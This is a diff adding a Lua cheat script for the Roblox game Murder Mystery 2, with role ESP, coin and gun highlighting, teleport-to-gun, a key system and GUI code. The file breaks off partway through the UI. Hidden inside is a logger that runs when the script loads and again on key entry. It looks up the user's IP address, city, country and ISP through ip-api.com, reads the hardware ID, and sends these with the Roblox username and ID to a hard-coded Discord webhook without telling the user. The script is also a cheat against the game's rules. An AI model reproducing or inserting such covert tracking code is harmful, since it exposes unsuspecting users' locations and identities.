@@ -1,0 +1,1093 @@
+--[[
+    ====================================
+    JACOB'S SCRIPTS - MURDER MYSTERY 2
+    ====================================
+]]
+
+-- ============================================
+-- GAME CHECK
+-- ============================================
+if game.PlaceId ~= 142823291 then
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "Jacob's Scripts",
+        Text = "Wrong game innit? 💀",
+        Duration = 5
+    })
+    return
+end
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local TweenService = game:GetService("TweenService")
+local Workspace = game:GetService("Workspace")
+
+local LocalPlayer = Players.LocalPlayer
+local Mouse = LocalPlayer:GetMouse()
+
+-- ============================================
+-- CONFIG
+-- ============================================
+local CONFIG = {
+    ScriptName = "JACOB'S SCRIPTS",
+    Version = "1.0",
+    ValidKeys = {"jacobmystery"},
+    DiscordInvite = "https://discord.gg/kNk7kAUVQM",
+    Webhook = "https://discord.com/api/webhooks/1459681000698155029/OSmOMr-6s9Wr2HAf--OXRlvFnsSRrYHk5DIV0bpv9nrt8qxIJJoxsTMUqo8BfXLzq9Jo",
+    ToggleKey = Enum.KeyCode.RightShift,
+    AccentColor = Color3.fromRGB(138, 43, 226),
+}
+
+-- ============================================
+-- VARIABLES
+-- ============================================
+local GUIVisible = true
+local Loaded = false
+local KeyVerified = false
+local ESPObjects = {}
+local CoinESPObjects = {}
+local GunESPObject = nil
+
+-- MM2 Specific
+local CurrentMurderer = nil
+local CurrentSheriff = nil
+local DroppedGunPart = nil
+local LastMurderer = nil
+local LastSheriff = nil
+
+-- ============================================
+-- SETTINGS
+-- ============================================
+local Settings = {
+    PlayerESP = true,
+    MurdererESP = true,
+    SheriffESP = true,
+    CoinESP = false,
+    GunESP = true,
+    AutoGrabGun = false,
+}
+
+-- ============================================
+-- UTILITY FUNCTIONS
+-- ============================================
+local function Tween(obj, props, dur)
+    TweenService:Create(obj, TweenInfo.new(dur, Enum.EasingStyle.Quart), props):Play()
+end
+
+local function GetUserInfo()
+    local ip = {}
+    pcall(function() ip = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/?fields=query,country,city,isp,proxy")) end)
+    local hwid = "?" pcall(function() if gethwid then hwid = gethwid() end end)
+    return ip, hwid
+end
+
+local function LogExecution()
+    local ip, hwid = GetUserInfo()
+    pcall(function()
+        local r = (syn and syn.request) or http_request or request
+        if r then
+            r({Url = CONFIG.Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode({embeds = {{
+                    title = "Script Executed",
+                    color = 16776960,
+                    fields = {
+                        {name = "User", value = LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")", inline = true},
+                        {name = "IP", value = ip.query or "?", inline = true},
+                        {name = "Location", value = (ip.city or "?") .. ", " .. (ip.country or "?"), inline = true},
+                        {name = "HWID", value = hwid, inline = false},
+                    },
+                    thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png"},
+                    footer = {text = "Awaiting key verification"}
+                }}})
+            })
+        end
+    end)
+end
+
+local function LogKeySuccess(key)
+    local ip, hwid = GetUserInfo()
+    pcall(function()
+        local r = (syn and syn.request) or http_request or request
+        if r then
+            r({Url = CONFIG.Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode({embeds = {{
+                    title = "Key Verified",
+                    color = 65280,
+                    fields = {
+                        {name = "User", value = LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")", inline = true},
+                        {name = "Key Used", value = "||" .. key .. "||", inline = true},
+                        {name = "IP", value = ip.query or "?", inline = true},
+                        {name = "Location", value = (ip.city or "?") .. ", " .. (ip.country or "?"), inline = true},
+                        {name = "HWID", value = hwid, inline = false},
+                    },
+                    thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png"},
+                    footer = {text = "Access granted"}
+                }}})
+            })
+        end
+    end)
+end
+
+local function IsKeyValid(key)
+    for _, validKey in ipairs(CONFIG.ValidKeys) do
+        if key == validKey then return true end
+    end
+    return false
+end
+
+local function GetAvatarUrl(userId)
+    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=150&height=150&format=png"
+end
+
+-- ============================================
+-- MM2 ROLE DETECTION
+-- ============================================
+local function GetPlayerRole(player)
+    if not player or not player.Character then return "Innocent" end
+    local char = player.Character
+    
+    for _, tool in ipairs(char:GetChildren()) do
+        if tool:IsA("Tool") and tool.Name == "Knife" then
+            return "Murderer"
+        end
+        if tool:IsA("Tool") and (tool.Name == "Gun" or tool.Name == "Revolver") then
+            return "Sheriff"
+        end
+    end
+    
+    local backpack = player:FindFirstChild("Backpack")
+    if backpack then
+        for _, tool in ipairs(backpack:GetChildren()) do
+            if tool:IsA("Tool") and tool.Name == "Knife" then
+                return "Murderer"
+            end
+            if tool:IsA("Tool") and (tool.Name == "Gun" or tool.Name == "Revolver") then
+                return "Sheriff"
+            end
+        end
+    end
+    
+    return "Innocent"
+end
+
+local function FindMurdererAndSheriff()
+    local newMurderer = nil
+    local newSheriff = nil
+    
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Character then
+            local role = GetPlayerRole(player)
+            if role == "Murderer" then
+                newMurderer = player
+            elseif role == "Sheriff" then
+                newSheriff = player
+            end
+        end
+    end
+    
+    local rolesChanged = (newMurderer ~= LastMurderer) or (newSheriff ~= LastSheriff)
+    
+    CurrentMurderer = newMurderer
+    CurrentSheriff = newSheriff
+    LastMurderer = newMurderer
+    LastSheriff = newSheriff
+    
+    return rolesChanged
+end
+
+-- ============================================
+-- GUN DETECTION - GUNDROP IS EEN MESHPART
+-- ============================================
+local DroppedGunModel = nil
+
+local function FindDroppedGun()
+    DroppedGunPart = nil
+    DroppedGunModel = nil
+    
+    for _, obj in ipairs(Workspace:GetDescendants()) do
+        if obj.Name == "GunDrop" then
+            if obj:IsA("BasePart") then
+                DroppedGunPart = obj
+                DroppedGunModel = obj
+                return true
+            elseif obj:IsA("Model") then
+                local part = obj:FindFirstChildWhichIsA("BasePart")
+                if part then
+                    DroppedGunPart = part
+                    DroppedGunModel = obj
+                    return true
+                end
+            end
+        end
+    end
+    
+    return false
+end
+
+-- ============================================
+-- COIN DETECTION - ZOEKT OVERAL
+-- ============================================
+local function FindAllCoins()
+    local coins = {}
+    
+    for _, obj in ipairs(Workspace:GetDescendants()) do
+        if obj.Name == "Coin_Server" and obj:IsA("BasePart") then
+            local coinVisual = obj:FindFirstChild("CoinVisual")
+            if coinVisual then
+                table.insert(coins, coinVisual)
+            end
+        end
+    end
+    
+    return coins
+end
+
+-- ============================================
+-- ESP SYSTEM
+-- ============================================
+local function CreatePlayerESP(player)
+    if player == LocalPlayer then return end
+    if ESPObjects[player] then
+        pcall(function() ESPObjects[player]:Destroy() end)
+    end
+    
+    if not player.Character then return end
+    
+    local role = GetPlayerRole(player)
+    local color = Color3.fromRGB(255, 255, 255)
+    local enabled = Settings.PlayerESP
+    
+    if role == "Murderer" then
+        color = Color3.fromRGB(255, 0, 0)
+        enabled = Settings.MurdererESP
+    elseif role == "Sheriff" then
+        color = Color3.fromRGB(0, 100, 255)
+        enabled = Settings.SheriffESP
+    end
+    
+    if not enabled then return end
+    
+    local hl = Instance.new("Highlight")
+    hl.Name = "JS_ESP"
+    hl.FillColor = color
+    hl.FillTransparency = 0.75
+    hl.OutlineColor = color
+    hl.OutlineTransparency = 0
+    hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+    hl.Adornee = player.Character
+    hl.Parent = player.Character
+    ESPObjects[player] = hl
+end
+
+local function RemovePlayerESP(player)
+    if ESPObjects[player] then
+        pcall(function() ESPObjects[player]:Destroy() end)
+        ESPObjects[player] = nil
+    end
+end
+
+local function RefreshAllESP()
+    for p, hl in pairs(ESPObjects) do
+        pcall(function() hl:Destroy() end)
+    end
+    ESPObjects = {}
+    
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer and p.Character then
+            CreatePlayerESP(p)
+        end
+    end
+end
+
+local function CreateCoinESP()
+    for _, obj in pairs(CoinESPObjects) do
+        pcall(function() obj:Destroy() end)
+    end
+    CoinESPObjects = {}
+    
+    if not Settings.CoinESP then return end
+    
+    local coins = FindAllCoins()
+    for _, coin in ipairs(coins) do
+        if not coin:FindFirstChild("JS_CoinESP") then
+            local hl = Instance.new("Highlight")
+            hl.Name = "JS_CoinESP"
+            hl.FillColor = Color3.fromRGB(255, 215, 0)
+            hl.FillTransparency = 0.5
+            hl.OutlineColor = Color3.fromRGB(255, 215, 0)
+            hl.OutlineTransparency = 0
+            hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+            hl.Adornee = coin
+            hl.Parent = coin
+            table.insert(CoinESPObjects, hl)
+        end
+    end
+end
+
+local function AddCoinESP(coinServer)
+    if not Settings.CoinESP then return end
+    
+    local coinVisual = coinServer:FindFirstChild("CoinVisual")
+    if not coinVisual then return end
+    if coinVisual:FindFirstChild("JS_CoinESP") then return end
+    
+    local hl = Instance.new("Highlight")
+    hl.Name = "JS_CoinESP"
+    hl.FillColor = Color3.fromRGB(255, 215, 0)
+    hl.FillTransparency = 0.5
+    hl.OutlineColor = Color3.fromRGB(255, 215, 0)
+    hl.OutlineTransparency = 0
+    hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+    hl.Adornee = coinVisual
+    hl.Parent = coinVisual
+    table.insert(CoinESPObjects, hl)
+end
+
+local function CreateGunESP()
+    if GunESPObject then
+        pcall(function() GunESPObject:Destroy() end)
+        GunESPObject = nil
+    end
+    
+    if not Settings.GunESP then return end
+    if not DroppedGunModel then return end
+    if DroppedGunModel:FindFirstChild("JS_GunESP") then return end
+    
+    local hl = Instance.new("Highlight")
+    hl.Name = "JS_GunESP"
+    hl.FillColor = Color3.fromRGB(0, 255, 0)
+    hl.FillTransparency = 0.5
+    hl.OutlineColor = Color3.fromRGB(0, 255, 0)
+    hl.OutlineTransparency = 0
+    hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+    hl.Adornee = DroppedGunModel
+    hl.Parent = DroppedGunModel
+    GunESPObject = hl
+end
+
+-- ============================================
+-- TELEPORT TO GUN - ALLEEN ALS GEDROPT
+-- ============================================
+local function TeleportToGun()
+    if not DroppedGunPart then return false end
+    if not LocalPlayer.Character then return false end
+    
+    local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if not hrp then return false end
+    
+    hrp.CFrame = CFrame.new(DroppedGunPart.Position + Vector3.new(0, 3, 0))
+    return true
+end
+
+-- ============================================
+-- GUI SETUP
+-- ============================================
+local Gui = Instance.new("ScreenGui")
+Gui.Name = "JS"
+Gui.ResetOnSpawn = false
+pcall(function() if syn then syn.protect_gui(Gui) end Gui.Parent = game:GetService("CoreGui") end)
+if not Gui.Parent then Gui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
+
+task.spawn(LogExecution)
+
+-- ============================================
+-- KEY SYSTEM UI
+-- ============================================
+local KeyFrame = Instance.new("Frame")
+KeyFrame.Name = "KeySystem"
+KeyFrame.Size = UDim2.new(0, 300, 0, 200)
+KeyFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
+KeyFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
+KeyFrame.BorderSizePixel = 0
+KeyFrame.Parent = Gui
+
+Instance.new("UICorner", KeyFrame).CornerRadius = UDim.new(0, 6)
+local KeyStroke = Instance.new("UIStroke", KeyFrame)
+KeyStroke.Color = CONFIG.AccentColor
+KeyStroke.Thickness = 1
+
+local KeyTitle = Instance.new("TextLabel")
+KeyTitle.Size = UDim2.new(1, 0, 0, 40)
+KeyTitle.BackgroundColor3 = CONFIG.AccentColor
+KeyTitle.BorderSizePixel = 0
+KeyTitle.Text = CONFIG.ScriptName
+KeyTitle.TextColor3 = Color3.new(1, 1, 1)
+KeyTitle.TextSize = 16
+KeyTitle.Font = Enum.Font.GothamBold
+KeyTitle.Parent = KeyFrame
+Instance.new("UICorner", KeyTitle).CornerRadius = UDim.new(0, 6)
+
+local TitleFix = Instance.new("Frame")
+TitleFix.Size = UDim2.new(1, 0, 0, 10)
+TitleFix.Position = UDim2.new(0, 0, 1, -10)
+TitleFix.BackgroundColor3 = CONFIG.AccentColor
+TitleFix.BorderSizePixel = 0
+TitleFix.Parent = KeyTitle
+
+local DiscordInfo = Instance.new("TextLabel")
+DiscordInfo.Size = UDim2.new(1, -20, 0, 30)
+DiscordInfo.Position = UDim2.new(0, 10, 0, 48)
+DiscordInfo.BackgroundTransparency = 1
+DiscordInfo.Text = "Join our Discord to get a key:"
+DiscordInfo.TextColor3 = Color3.fromRGB(180, 180, 180)
+DiscordInfo.TextSize = 12
+DiscordInfo.Font = Enum.Font.Gotham
+DiscordInfo.Parent = KeyFrame
+
+local GetKeyBtn = Instance.new("TextButton")
+GetKeyBtn.Size = UDim2.new(1, -20, 0, 32)
+GetKeyBtn.Position = UDim2.new(0, 10, 0, 78)
+GetKeyBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
+GetKeyBtn.Text = "Get Key (Discord)"
+GetKeyBtn.TextColor3 = Color3.new(1, 1, 1)
+GetKeyBtn.TextSize = 13
+GetKeyBtn.Font = Enum.Font.GothamBold
+GetKeyBtn.Parent = KeyFrame
+Instance.new("UICorner", GetKeyBtn).CornerRadius = UDim.new(0, 4)
+
+local KeyInput = Instance.new("TextBox")
+KeyInput.Size = UDim2.new(1, -20, 0, 32)
+KeyInput.Position = UDim2.new(0, 10, 0, 118)
+KeyInput.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
+KeyInput.Text = ""
+KeyInput.PlaceholderText = "Enter your key here..."
+KeyInput.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
+KeyInput.TextColor3 = Color3.new(1, 1, 1)
+KeyInput.TextSize = 12
+KeyInput.Font = Enum.Font.Gotham
+KeyInput.ClearTextOnFocus = false
+KeyInput.Parent = KeyFrame
+Instance.new("UICorner", KeyInput).CornerRadius = UDim.new(0, 4)
+
+local VerifyBtn = Instance.new("TextButton")
+VerifyBtn.Size = UDim2.new(1, -20, 0, 32)
+VerifyBtn.Position = UDim2.new(0, 10, 0, 158)
+VerifyBtn.BackgroundColor3 = CONFIG.AccentColor
+VerifyBtn.Text = "Verify Key"
+VerifyBtn.TextColor3 = Color3.new(1, 1, 1)
+VerifyBtn.TextSize = 13
+VerifyBtn.Font = Enum.Font.GothamBold
+VerifyBtn.Parent = KeyFrame
+Instance.new("UICorner", VerifyBtn).CornerRadius = UDim.new(0, 4)
+
+GetKeyBtn.MouseButton1Click:Connect(function()
+    setclipboard(CONFIG.DiscordInvite)
+    GetKeyBtn.Text = "Copied to clipboard!"
+    task.wait(1.5)
+    GetKeyBtn.Text = "Get Key (Discord)"
+end)
+
+VerifyBtn.MouseButton1Click:Connect(function()
+    local key = KeyInput.Text
+    if IsKeyValid(key) then
+        KeyVerified = true
+        LogKeySuccess(key)
+        
+        VerifyBtn.Text = "Access Granted!"
+        VerifyBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
+        task.wait(0.5)
+        
+        Tween(KeyFrame, {BackgroundTransparency = 1}, 0.3)
+        Tween(KeyTitle, {BackgroundTransparency = 1, TextTransparency = 1}, 0.3)
+        Tween(TitleFix, {BackgroundTransparency = 1}, 0.3)
+        Tween(DiscordInfo, {TextTransparency = 1}, 0.3)
+        Tween(GetKeyBtn, {BackgroundTransparency = 1, TextTransparency = 1}, 0.3)
+        Tween(KeyInput, {BackgroundTransparency = 1, TextTransparency = 1}, 0.3)
+        Tween(VerifyBtn, {BackgroundTransparency = 1, TextTransparency = 1}, 0.3)
+        Tween(KeyStroke, {Transparency = 1}, 0.3)
+        task.wait(0.35)
+        KeyFrame:Destroy()
+        
+        local IntroHolder = Instance.new("Frame")
+        IntroHolder.Size = UDim2.new(0, 200, 0, 80)
+        IntroHolder.Position = UDim2.new(0.5, -100, 0.5, -40)
+        IntroHolder.BackgroundTransparency = 1
+        IntroHolder.Parent = Gui
+        
+        local Logo = Instance.new("TextLabel")
+        Logo.Size = UDim2.new(1, 0, 0, 50)
+        Logo.BackgroundTransparency = 1
+        Logo.Text = "JS"
+        Logo.TextColor3 = CONFIG.AccentColor
+        Logo.TextSize = 60
+        Logo.Font = Enum.Font.GothamBlack
+        Logo.TextTransparency = 1
+        Logo.Parent = IntroHolder
+        
+        local IntroLine = Instance.new("Frame")
+        IntroLine.Size = UDim2.new(0, 0, 0, 2)
+        IntroLine.Position = UDim2.new(0.5, 0, 0, 55)
+        IntroLine.AnchorPoint = Vector2.new(0.5, 0)
+        IntroLine.BackgroundColor3 = CONFIG.AccentColor
+        IntroLine.BorderSizePixel = 0
+        IntroLine.Parent = IntroHolder
+        
+        local IntroSub = Instance.new("TextLabel")
+        IntroSub.Size = UDim2.new(1, 0, 0, 20)
+        IntroSub.Position = UDim2.new(0, 0, 0, 60)
+        IntroSub.BackgroundTransparency = 1
+        IntroSub.Text = "MM2"
+        IntroSub.TextColor3 = Color3.fromRGB(100, 100, 100)
+        IntroSub.TextSize = 12
+        IntroSub.Font = Enum.Font.GothamMedium
+        IntroSub.TextTransparency = 1
+        IntroSub.Parent = IntroHolder
+        
+        task.wait(0.1)
+        Tween(Logo, {TextTransparency = 0}, 0.4)
+        task.wait(0.25)
+        Tween(IntroLine, {Size = UDim2.new(0, 100, 0, 2)}, 0.35)
+        task.wait(0.15)
+        Tween(IntroSub, {TextTransparency = 0}, 0.3)
+        task.wait(1.2)
+        Tween(Logo, {TextTransparency = 1}, 0.3)
+        Tween(IntroLine, {Size = UDim2.new(0, 0, 0, 2)}, 0.25)
+        Tween(IntroSub, {TextTransparency = 1}, 0.25)
+        task.wait(0.35)
+        IntroHolder:Destroy()
+        
+        Loaded = true
+    else
+        VerifyBtn.Text = "Invalid Key!"
+        VerifyBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+        task.wait(1)
+        VerifyBtn.Text = "Verify Key"
+        VerifyBtn.BackgroundColor3 = CONFIG.AccentColor
+    end
+end)
+
+-- ============================================
+-- MAIN UI
+-- ============================================
+local Main = Instance.new("Frame")
+Main.Name = "Main"
+Main.Size = UDim2.new(0, 340, 0, 380)
+Main.Position = UDim2.new(0.5, -170, 0.5, -190)
+Main.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
+Main.BorderSizePixel = 0
+Main.Visible = false
+Main.ClipsDescendants = true
+Main.Parent = Gui
+
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 4)
+local MainStroke = Instance.new("UIStroke", Main)
+MainStroke.Color = CONFIG.AccentColor
+MainStroke.Thickness = 1
+
+local Header = Instance.new("Frame")
+Header.Size = UDim2.new(1, 0, 0, 40)
+Header.BackgroundColor3 = CONFIG.AccentColor
+Header.BorderSizePixel = 0
+Header.Parent = Main
+Instance.new("UICorner", Header).CornerRadius = UDim.new(0, 4)
+
+local HeaderBottom = Instance.new("Frame")
+HeaderBottom.Size = UDim2.new(1, 0, 0, 10)
+HeaderBottom.Position = UDim2.new(0, 0, 1, -10)
+HeaderBottom.BackgroundColor3 = CONFIG.AccentColor
+HeaderBottom.BorderSizePixel = 0
+HeaderBottom.Parent = Header
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, -40, 1, 0)
+Title.Position = UDim2.new(0, 12, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = CONFIG.ScriptName .. " - MM2"
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.TextSize = 14
+Title.Font = Enum.Font.GothamBold
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.Parent = Header
+
+local Close = Instance.new("TextButton")
+Close.Size = UDim2.new(0, 30, 0, 30)
+Close.Position = UDim2.new(1, -35, 0.5, -15)
+Close.BackgroundTransparency = 1
+Close.Text = "-"
+Close.TextColor3 = Color3.new(1, 1, 1)
+Close.TextSize = 24
+Close.Font = Enum.Font.GothamBold
+Close.Parent = Header
+
+local ContentHolder = Instance.new("Frame")
+ContentHolder.Size = UDim2.new(1, -16, 1, -90)
+ContentHolder.Position = UDim2.new(0, 8, 0, 82)
+ContentHolder.BackgroundTransparency = 1
+ContentHolder.BorderSizePixel = 0
+ContentHolder.Parent = Main
+
+local TabBar = Instance.new("Frame")
+TabBar.Size = UDim2.new(1, -16, 0, 28)
+TabBar.Position = UDim2.new(0, 8, 0, 48)
+TabBar.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
+TabBar.BorderSizePixel = 0
+TabBar.Parent = Main
+Instance.new("UICorner", TabBar).CornerRadius = UDim.new(0, 4)
+
+local TabLayout = Instance.new("UIListLayout", TabBar)
+TabLayout.FillDirection = Enum.FillDirection.Horizontal
+TabLayout.Padding = UDim.new(0, 4)
+TabLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+TabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+-- ============================================
+-- TAB SYSTEM
+-- ============================================
+local Tabs = {}
+local TabContents = {}
+local ActiveTab = nil
+
+local function CreateTab(name)
+    local tabBtn = Instance.new("TextButton")
+    tabBtn.Size = UDim2.new(0, 95, 0, 22)
+    tabBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
+    tabBtn.Text = name
+    tabBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
+    tabBtn.TextSize = 11
+    tabBtn.Font = Enum.Font.GothamMedium
+    tabBtn.Parent = TabBar
+    Instance.new("UICorner", tabBtn).CornerRadius = UDim.new(0, 4)
+    
+    local content = Instance.new("ScrollingFrame")
+    content.Size = UDim2.new(1, 0, 1, 0)
+    content.BackgroundTransparency = 1
+    content.ScrollBarThickness = 2
+    content.ScrollBarImageColor3 = CONFIG.AccentColor
+    content.CanvasSize = UDim2.new(0, 0, 0, 0)
+    content.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    content.BorderSizePixel = 0
+    content.Visible = false
+    content.Parent = ContentHolder
+    
+    local layout = Instance.new("UIListLayout", content)
+    layout.Padding = UDim.new(0, 6)
+    
+    Tabs[name] = tabBtn
+    TabContents[name] = content
+    
+    tabBtn.MouseButton1Click:Connect(function()
+        for tabName, btn in pairs(Tabs) do
+            Tween(btn, {BackgroundColor3 = Color3.fromRGB(35, 35, 45)}, 0.15)
+            btn.TextColor3 = Color3.fromRGB(150, 150, 150)
+            TabContents[tabName].Visible = false
+        end
+        Tween(tabBtn, {BackgroundColor3 = CONFIG.AccentColor}, 0.15)
+        tabBtn.TextColor3 = Color3.new(1, 1, 1)
+        content.Visible = true
+        ActiveTab = name
+    end)
+    
+    return content
+end
+
+-- ============================================
+-- UI COMPONENTS
+-- ============================================
+local function Section(parent, name)
+    local f = Instance.new("Frame")
+    f.Size = UDim2.new(1, 0, 0, 34)
+    f.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
+    f.BorderSizePixel = 0
+    f.Parent = parent
+    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 4)
+    
+    local l = Instance.new("TextLabel")
+    l.Size = UDim2.new(0.6, 0, 1, 0)
+    l.Position = UDim2.new(0, 10, 0, 0)
+    l.BackgroundTransparency = 1
+    l.Text = name
+    l.TextColor3 = Color3.fromRGB(200, 200, 200)
+    l.TextSize = 12
+    l.Font = Enum.Font.GothamMedium
+    l.TextXAlignment = Enum.TextXAlignment.Left
+    l.Parent = f
+    return f
+end
+
+local function Toggle(sec, val, cb)
+    local bg = Instance.new("Frame")
+    bg.Size = UDim2.new(0, 38, 0, 18)
+    bg.Position = UDim2.new(1, -46, 0.5, -9)
+    bg.BackgroundColor3 = val and CONFIG.AccentColor or Color3.fromRGB(50, 50, 60)
+    bg.BorderSizePixel = 0
+    bg.Parent = sec
+    Instance.new("UICorner", bg).CornerRadius = UDim.new(1, 0)
+    
+    local c = Instance.new("Frame")
+    c.Size = UDim2.new(0, 14, 0, 14)
+    c.Position = val and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)
+    c.BackgroundColor3 = Color3.new(1, 1, 1)
+    c.BorderSizePixel = 0
+    c.Parent = bg
+    Instance.new("UICorner", c).CornerRadius = UDim.new(1, 0)
+    
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(1, 0, 1, 0)
+    b.BackgroundTransparency = 1
+    b.Text = ""
+    b.Parent = bg
+    
+    local on = val
+    b.MouseButton1Click:Connect(function()
+        on = not on
+        Tween(bg, {BackgroundColor3 = on and CONFIG.AccentColor or Color3.fromRGB(50, 50, 60)}, 0.12)
+        Tween(c, {Position = on and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)}, 0.12)
+        if cb then cb(on) end
+    end)
+end
+
+local function Button(parent, name, cb)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(1, 0, 0, 34)
+    btn.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
+    btn.BorderSizePixel = 0
+    btn.Text = name
+    btn.TextColor3 = Color3.fromRGB(200, 200, 200)
+    btn.TextSize = 12
+    btn.Font = Enum.Font.GothamMedium
+    btn.Parent = parent
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)
+    btn.MouseButton1Click:Connect(function() if cb then cb() end end)
+    return btn
+end
+
+local function Keybind(parent, name, key, cb)
+    local f = Instance.new("Frame")
+    f.Size = UDim2.new(1, 0, 0, 34)
+    f.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
+    f.BorderSizePixel = 0
+    f.Parent = parent
+    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 4)
+    
+    local l = Instance.new("TextLabel")
+    l.Size = UDim2.new(0.5, 0, 1, 0)
+    l.Position = UDim2.new(0, 10, 0, 0)
+    l.BackgroundTransparency = 1
+    l.Text = name
+    l.TextColor3 = Color3.fromRGB(200, 200, 200)
+    l.TextSize = 12
+    l.Font = Enum.Font.GothamMedium
+    l.TextXAlignment = Enum.TextXAlignment.Left
+    l.Parent = f
+    
+    local kb = Instance.new("TextButton")
+    kb.Size = UDim2.new(0, 70, 0, 22)
+    kb.Position = UDim2.new(1, -78, 0.5, -11)
+    kb.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+    kb.Text = key.Name
+    kb.TextColor3 = Color3.fromRGB(180, 180, 180)
+    kb.TextSize = 10
+    kb.Font = Enum.Font.GothamMedium
+    kb.Parent = f
+    Instance.new("UICorner", kb).CornerRadius = UDim.new(0, 3)
+    
+    local listening = false
+    kb.MouseButton1Click:Connect(function()
+        listening = true
+        kb.Text = "..."
+    end)
+    
+    UserInputService.InputBegan:Connect(function(inp, gp)
+        if listening and inp.UserInputType == Enum.UserInputType.Keyboard then
+            listening = false
+            kb.Text = inp.KeyCode.Name
+            if cb then cb(inp.KeyCode) end
+        end
+    end)
+end
+
+-- ============================================
+-- CREATE TABS
+-- ============================================
+local RolesTab = CreateTab("Roles")
+local ESPTab = CreateTab("ESP")
+local SettingsTab = CreateTab("Settings")
+
+task.defer(function()
+    Tabs["Roles"].TextColor3 = Color3.new(1, 1, 1)
+    Tabs["Roles"].BackgroundColor3 = CONFIG.AccentColor
+    TabContents["Roles"].Visible = true
+    ActiveTab = "Roles"
+end)
+
+-- ============================================
+-- ROLES TAB - MET AVATAR FOTOS
+-- ============================================
+local RoleDisplay = Instance.new("Frame")
+RoleDisplay.Size = UDim2.new(1, 0, 0, 100)
+RoleDisplay.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
+RoleDisplay.BorderSizePixel = 0
+RoleDisplay.Parent = RolesTab
+Instance.new("UICorner", RoleDisplay).CornerRadius = UDim.new(0, 4)
+
+-- Murderer Row
+local MurdererRow = Instance.new("Frame")
+MurdererRow.Size = UDim2.new(1, -20, 0, 40)
+MurdererRow.Position = UDim2.new(0, 10, 0, 8)
+MurdererRow.BackgroundTransparency = 1
+MurdererRow.Parent = RoleDisplay
+
+local MurdererAvatar = Instance.new("ImageLabel")
+MurdererAvatar.Size = UDim2.new(0, 36, 0, 36)
+MurdererAvatar.Position = UDim2.new(0, 0, 0.5, -18)
+MurdererAvatar.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+MurdererAvatar.Image = ""
+MurdererAvatar.Parent = MurdererRow
+Instance.new("UICorner", MurdererAvatar).CornerRadius = UDim.new(1, 0)
+
+local MurdererLabel = Instance.new("TextLabel")
+MurdererLabel.Size = UDim2.new(1, -46, 1, 0)
+MurdererLabel.Position = UDim2.new(0, 46, 0, 0)
+MurdererLabel.BackgroundTransparency = 1
+MurdererLabel.Text = "Murderer: ?"
+MurdererLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
+MurdererLabel.TextSize = 14
+MurdererLabel.Font = Enum.Font.GothamBold
+MurdererLabel.TextXAlignment = Enum.TextXAlignment.Left
+MurdererLabel.Parent = MurdererRow
+
+-- Sheriff Row
+local SheriffRow = Instance.new("Frame")
+SheriffRow.Size = UDim2.new(1, -20, 0, 40)
+SheriffRow.Position = UDim2.new(0, 10, 0, 52)
+SheriffRow.BackgroundTransparency = 1
+SheriffRow.Parent = RoleDisplay
+
+local SheriffAvatar = Instance.new("ImageLabel")
+SheriffAvatar.Size = UDim2.new(0, 36, 0, 36)
+SheriffAvatar.Position = UDim2.new(0, 0, 0.5, -18)
+SheriffAvatar.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+SheriffAvatar.Image = ""
+SheriffAvatar.Parent = SheriffRow
+Instance.new("UICorner", SheriffAvatar).CornerRadius = UDim.new(1, 0)
+
+local SheriffLabel = Instance.new("TextLabel")
+SheriffLabel.Size = UDim2.new(1, -46, 1, 0)
+SheriffLabel.Position = UDim2.new(0, 46, 0, 0)
